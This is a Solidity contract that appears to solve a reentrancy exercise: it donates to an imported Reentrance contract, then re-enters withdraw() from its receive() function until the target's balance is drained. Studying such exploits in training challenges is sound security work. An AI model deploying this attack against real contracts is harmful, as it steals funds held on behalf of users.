// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    Reentrance re;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        re = Reentrance(contractAddress);

    }

    function hackContract() external payable {
        // Code me!
        re.donate{value: address(this).balance}(address(this));
        re.withdraw();

    }

    receive() external payable {

        if (contractAddress.balance >= 1) {
           re.withdraw();
        }

    


        }
}
